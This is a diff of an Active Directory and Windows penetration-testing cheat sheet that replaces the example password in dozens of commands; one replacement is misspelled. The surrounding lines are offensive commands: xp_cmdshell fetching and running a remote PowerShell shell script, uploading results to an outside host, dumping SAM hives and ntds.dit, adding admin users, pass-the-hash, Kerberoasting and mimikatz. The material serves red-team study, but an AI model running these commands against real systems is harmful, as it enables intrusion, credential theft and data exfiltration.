@@ -453,7 +453,7 @@ msf > irb
 Mount:
 
 ```
-root@kali:$ mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=j1v37u2k3y,[pass='Passw0rd!']
+root@kali:$ mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=j1v37u2k3y,[pass='P@sw0rd123']
 ```
 
 Status:
@@ -481,7 +481,7 @@ root@kali:$ smbclient -N '\\127.0.0.1\Data'
 With user creds:
 
 ```
-root@kali:$ smbclient -U j1v37u2k3y '\\127.0.0.1\Users' 'Passw0rd!'
+root@kali:$ smbclient -U j1v37u2k3y '\\127.0.0.1\Users' 'P@ssw0rd123'
 ```
 
 
@@ -504,7 +504,7 @@ root@kali:$ smbmap -H 127.0.0.1 -u null -p "" -R
 
 ```
 root@kali:$ showmount -e 127.0.0.1
-root@kali:$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=j1v37u2k3y,[pass='Passw0rd!']
+root@kali:$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=j1v37u2k3y,[pass='P@ssw0rd123']
 ```
 
 * [resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
@@ -562,7 +562,7 @@ $ ldapsearch -h 127.0.0.1 -x -b "dc=megacorp,dc=local" '(ms-MCS-AdmPwd=*)' ms-MC
 Simple authentication with ldapsearch:
 
 ```
-$ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=megacorp,DC=local' -w 'Passw0rd!' -s sub -b 'DC=megacorp,DC=local' |tee ldapsearch.log
+$ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=megacorp,DC=local' -w 'P@ssw0rd123' -s sub -b 'DC=megacorp,DC=local' |tee ldapsearch.log
 ```
 
 Analyze large output for anomalies by searching for unique strings:
@@ -593,7 +593,7 @@ $ sudo python3 -m pip install -r requirements.txt
 Enumerate all AD Computers:
 
 ```
-./windapsearch.py -u 'megacorp.local\j1v37u2k3y' -p 'Passw0rd!' --dc 127.0.0.1 -C
+./windapsearch.py -u 'megacorp.local\j1v37u2k3y' -p 'P@ssw0rd123' --dc 127.0.0.1 -C
 ```
 
 
@@ -639,7 +639,7 @@ $ nmap -p 139,445 --script=/usr/share/nmap/scripts/smb-os-discovery --script-arg
 
 ```
 root@kali:$ rpcclient -U '' -N 127.0.0.1
-root@kali:$ rpcclient -U 'j1v37u2k3y%Passw0rd!' 127.0.0.1
+root@kali:$ rpcclient -U 'j1v37u2k3y%P@ssw0rd123' 127.0.0.1
 
 rpcclient $> enumdomusers
 rpcclient $> enumdomgroups
@@ -702,15 +702,15 @@ PS > Get-ADPrincipalGroupMembership j1v37u2k3y | select Name
 Create new domain user:
 
 ```
-PS > net user j1v37u2k3y Passw0rd! /ADD /DOMAIN
+PS > net user j1v37u2k3y P@ssw0rd123 /ADD /DOMAIN
 Or
-PS > New-ADUser -Name j1v37u2k3y -SamAccountName j1v37u2k3y -Path "CN=Users,DC=megacorp,DC=local" -AccountPassword(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Enabled $true
+PS > New-ADUser -Name j1v37u2k3y -SamAccountName j1v37u2k3y -Path "CN=Users,DC=megacorp,DC=local" -AccountPassword(ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force) -Enabled $true
 ```
 
 Create new local user and add him to local admins:
 
 ```
-PS > net user testuser Passw0rd! /add
+PS > net user testuser P@ssw0rd123 /add
 PS > net localgroup administrators testuser /add
 ```
 
@@ -877,7 +877,7 @@ $ gem install evil-winrm
 Run:
 
 ```
-$ evil-winrm.rb -u j1v37u2k3y -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
+$ evil-winrm.rb -u j1v37u2k3y -p 'P@ssw0rd123' -i 127.0.0.1 -s `pwd` -e `pwd`
 ```
 
 
@@ -891,7 +891,7 @@ $ evil-winrm.rb -u j1v37u2k3y -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
 ### psexec.py
 
 ```
-root@kali:$ psexec.py j1v37u2k3y:'Passw0rd!'@127.0.0.1
+root@kali:$ psexec.py j1v37u2k3y:'P@ssw0rd123'@127.0.0.1
 root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 j1v37u2k3y@127.0.0.1
 ```
 
@@ -907,7 +907,7 @@ root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 j1v37u2k3y@127.0
 ### wmiexec.py
 
 ```
-root@kali:$ wmiexec.py j1v37u2k3y:'Passw0rd!'@127.0.0.1
+root@kali:$ wmiexec.py j1v37u2k3y:'P@ssw0rd123'@127.0.0.1
 root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 j1v37u2k3y@127.0.0.1
 ```
 
@@ -1022,7 +1022,7 @@ cmd /c reg.exe save hklm\sam C:\smb_pentest\sam.hive
 cmd /c reg.exe save hklm\security C:\smb_pentest\security.hive
 cmd /c net share pentest=c:\smb_pentest /GRANT:"Everyone,FULL"
 
-$ smbclient.py 'j1v37u2k3y:Passw0rd!@127.0.0.1'
+$ smbclient.py 'j1v37u2k3y:P@ssw0rd123@127.0.0.1'
 # use pentest
 # get ntds.dit
 # get system.hive
@@ -1353,9 +1353,9 @@ $ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/master/ScriptModifi
 Use:
 
 ```
-PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
+PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
 PS > [string] $cmd = gc .\evil
-PS > $dec = de "Passw0rd!" s4lt
+PS > $dec = de "P@ssw0rd123" s4lt
 PS > Invoke-Expression $dec
 ```
 
@@ -1758,8 +1758,8 @@ Socks5 proxy with Chisel in client mode:
 * [github.com/kost/revsocks](https://github.com/kost/revsocks)
 
 ```
-1. root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'Passw0rd!'
-2. user@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
+1. root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'P@ssw0rd123'
+2. user@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'P@ssw0rd123'
 ```
 
 
@@ -1927,8 +1927,8 @@ PowerUpSQL.ps1:
 ```
 $ curl -L https://github.com/NetSPI/PowerUpSQL/raw/master/PowerUpSQL.ps1 > powerupsql.ps1
 PS > Get-SQLInstanceDomain
-PS > Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10 -UserName sa -Password 'Passw0rd!' -Verbose
-PS > Invoke-SQLOSCmd -UserName sa -Password 'Passw0rd!' -Instance sqlsrv01.megacorp.local -Command whoami
+PS > Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10 -UserName sa -Password 'P@ssw0rd123' -Verbose
+PS > Invoke-SQLOSCmd -UserName sa -Password 'P@ssw0rd123' -Instance sqlsrv01.megacorp.local -Command whoami
 ```
 
 Sherlock.ps1:
@@ -2059,7 +2059,7 @@ PS > Stop-Service wuauserv
 #### PowerShell
 
 ```
-PS > $cred = New-Object System.Management.Automation.PSCredential('<HOSTNAME>\<USERNAME>', $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force))
+PS > $cred = New-Object System.Management.Automation.PSCredential('<HOSTNAME>\<USERNAME>', $(ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force))
 ```
 
 Invoke-Command with `-Credential`:
@@ -2157,7 +2157,7 @@ root@kali:$ ./hashcat64.exe -m 1000 -b
 ## MySQL/MariaDB
 
 ```
-root@kali:$ mysql -u j1v37u2k3y -p'Passw0rd!' -e 'show databases;'
+root@kali:$ mysql -u j1v37u2k3y -p'P@ssw0rd123' -e 'show databases;'
 ```
 
 
@@ -2240,7 +2240,7 @@ $ python3 odat.py tnspoison -s 127.0.0.1 -d CLREXTPROC --test-module
 ### sqsh
 
 ```
-root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\j1v37u2k3y' -P 'Passw0rd!'
+root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\j1v37u2k3y' -P 'P@ssw0rd123'
 1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.234/shell.ps1')"
 2> GO
 ```
@@ -2250,7 +2250,7 @@ root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\j1v37u2k3y' -P 'Passw0rd!'
 ### mssqlclient.py
 
 ```
-root@kali:$ mssqlclient.py MEGACORP/j1v37u2k3y:'Passw0rd!'@127.0.0.1 [-windows-auth]
+root@kali:$ mssqlclient.py MEGACORP/j1v37u2k3y:'P@ssw0rd123'@127.0.0.1 [-windows-auth]
 SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\")"
 ```
 
@@ -2262,7 +2262,7 @@ SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).Dow
 
 ```
 root@kali:$ python -m pip install mssql-cli
-root@kali:$ mssql-cli -S 127.0.0.1 -U 'MEGACORP\j1v37u2k3y' -P 'Passw0rd!'
+root@kali:$ mssql-cli -S 127.0.0.1 -U 'MEGACORP\j1v37u2k3y' -P 'P@ssw0rd123'
 ```
 
 
@@ -3347,7 +3347,7 @@ $ ./BloodHound
 Collect graphs via `Ingestors/SharpHound.ps1`:
 
 ```
-PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain megacorp.local -LDAPUser j1v37u2k3y -LDAPPass 'Passw0rd!'
+PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain megacorp.local -LDAPUser j1v37u2k3y -LDAPPass 'P@ssw0rd123'
 ```
 
 Run session loop (\~2 hours for best results):
@@ -3379,7 +3379,7 @@ Collect graphs via `BloodHound.py` (with BloodHound running):
 
 ```
 $ git clone https://github.com/fox-it/BloodHound.py ~/tools/BloodHound.py && cd ~/tools/BloodHound.py && python setup.py install && cd -
-$ bloodhound-python -c All -u j1v37u2k3y -p 'Passw0rd!' -d megacorp.local -ns 127.0.0.1
+$ bloodhound-python -c All -u j1v37u2k3y -p 'P@ssw0rd123' -d megacorp.local -ns 127.0.0.1
 ```
 
 
@@ -3395,13 +3395,13 @@ $ pipenv install -r requirements.txt && pipenv shell
 ```
 
 ```
-$ lookupsid.py MEGACORP/s.freeside:'Passw0rd!'@127.0.0.1 20000
+$ lookupsid.py MEGACORP/s.freeside:'P@ssw0rd123'@127.0.0.1 20000
 
 $ GetNPUsers.py MEGACORP/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.txt | tee GetNPUsers.log
 $ cat GetNPUsers.log | grep -v 'Client not found in Kerberos database'
 $ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=j1v37u2k3y hashes/asprep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 
-$ GetUserSPNs.py MEGACORP/s.freeside:'Passw0rd!' -dc-ip 127.0.0.1 -save
+$ GetUserSPNs.py MEGACORP/s.freeside:'P@ssw0rd123' -dc-ip 127.0.0.1 -save
 $ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=j1v37u2k3y hashes/tgsrep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
 
@@ -3427,9 +3427,9 @@ Use:
 $ CME smb 127.0.0.1
 $ CME smb 127.0.0.1 -u anonymous -p '' --shares
 $ CME smb 127.0.0.1 -u j1v37u2k3y -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
-$ CME smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on-success]
-$ CME smb 127.0.0.1 -u j1v37u2k3y -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
-$ CME smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
+$ CME smb 127.0.0.1 -u nullinux_users.txt -p 'P@ssw0rd123' --shares [--continue-on-success]
+$ CME smb 127.0.0.1 -u j1v37u2k3y -p 'P@ssw0rd123' --spider-folder 'E\$' --pattern s3cret
+$ CME smb 127.0.0.1 -u j.doe -p 'P@ssw0rd123' -d 'CORP' --spider Users --pattern '.'
 $ CME smb 127.0.0.1 -u j1v37u2k3y -p '' --local-auth --sam
 $ CME smb 127.0.0.1 -u j1v37u2k3y -p '' -M spider_plus
 $ CME smb 127.0.0.1 -u j1v37u2k3y -p '' -M mimikatz
@@ -3460,8 +3460,8 @@ PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
 * [github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py](https://github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py)
 
 ```
-$ python scan.py MEGACORP/j1v37u2k3y:'Passw0rd!'@10.10.13.37
-$ python scan.py --target-file DCs.txt MEGACORP/j1v37u2k3y:'Passw0rd!'
+$ python scan.py MEGACORP/j1v37u2k3y:'P@ssw0rd123'@10.10.13.37
+$ python scan.py --target-file DCs.txt MEGACORP/j1v37u2k3y:'P@ssw0rd123'
 ```
 
 
@@ -3483,7 +3483,7 @@ $proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\In
 PowerShell manually set proxy and upload file to remote HTTP server:
 
 ```
-$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential('j1v37u2k3y','Passw0rd!','megacorp.local');$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
+$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential('j1v37u2k3y','P@ssw0rd123','megacorp.local');$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
 ```
 
 
